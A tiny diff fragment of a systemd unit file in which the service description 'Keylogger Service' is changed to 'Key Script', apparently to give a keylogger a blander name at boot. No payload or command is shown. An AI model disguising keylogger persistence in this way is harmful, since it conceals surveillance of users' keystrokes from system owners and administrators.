@@ -1,5 +1,5 @@
 [Unit]
-Description=Keylogger Service
+Description=Key Script
 After=multi-user.target
 
 [Service]
